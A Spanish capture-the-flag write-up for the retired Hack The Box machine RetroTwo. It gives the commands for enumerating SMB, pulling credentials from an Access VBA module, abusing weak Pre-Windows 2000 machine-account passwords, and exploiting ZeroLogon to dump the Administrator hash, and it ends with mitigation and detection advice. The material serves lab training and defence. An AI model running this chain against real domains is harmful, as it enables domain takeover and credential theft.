---
machine: RetroTwo
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
pwned: false
tags: [windows, active-directory, access-database, pre-windows-2000, zerologon]
---

# RetroTwo — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin credenciales ni flags reales.

## Resumen

DC antiguo (Server 2008 R2) con un share SMB que contiene una base de datos Access. Un módulo VBA guarda credenciales de dominio; con ellas se enumera BloodHound y se abusa de contraseñas débiles de cuentas de equipo `Pre-Windows 2000`. El acceso RDP a un equipo antiguo permite explotar ZeroLogon (CVE-2020-1472) y obtener el hash de Administrator.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
netexec smb <IP> --shares
netexec smb <IP> -u '' -p '' --shares
```

El share expone un `.mdb`/`.accdb`. Se copia y se inspecciona en un entorno aislado:

```bash
mdb-tables access.mdb
mdb-export access.mdb <TABLE> > table.csv
```

También se revisan los módulos VBA con `olevba` o abriendo la base en Access. El módulo contiene un usuario y una contraseña de dominio; no se publican.

## Acceso inicial

```bash
netexec smb <IP> -u <USER> -p '<PASSWORD>' --shares
bloodhound-python -u <USER> -p '<PASSWORD>' -d retro2.vl -ns <IP> -c All
```

BloodHound muestra cuentas de equipo con contraseña previsible y compatibility Pre-Windows 2000. Se prueba la contraseña del nombre del equipo:

```bash
netexec smb <IP> -u 'FS01$' -p '<PASSWORD>' --shares
```

La cuenta de equipo permite montar el share y obtener acceso RDP a un servidor antiguo:

```bash
xfreerdp /u:'FS01$' /p:'<PASSWORD>' /v:<IP>
```

## Escalada

El host es Server 2008 R2 sin el parche de ZeroLogon. Se restablece la contraseña de la cuenta de equipo a vacía y se vuelca el hash de Administrator:

```bash
python3 zerologon.py <DC_NAME> <IP>
impacket-secretsdump -just-dc -hashes :<NTLM_HASH> administrator@<IP>
```

El hash permite `psexec`/`wmiexec` como Administrator. ZeroLogon es destructivo: en un entorno real se restaura la contraseña original después de la prueba.

## Flags

- `user.txt`: `<USER_FLAG>`
- `root.txt`: `<ROOT_FLAG>`

## Lecciones

- Las bases Access pueden contener macros con credenciales.
- Las cuentas de equipo con contraseña igual al nombre son un fallo clásico.
- `Pre-Windows 2000 Compatible Access` amplía la superficie de ataque.
- ZeroLogon requiere un DC sin parchear y puede romper la confianza del dominio.

## Detección y mitigación

- Aplicar el parche de CVE-2020-1472 y habilitar enforcement.
- Auditar cuentas de equipo con contraseñas débiles o antiguas.
- Restringir `Pre-Windows 2000 Compatible Access` y revisar sus miembros.
- Alertar de cambios de contraseña de equipo (4742) y autenticaciones Netlogon anómalas.

## Referencias

- <https://0xdf.gitlab.io/2025/07/22/htb-retrotwo.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2020-1472>
- <https://attack.mitre.org/techniques/T1068/>
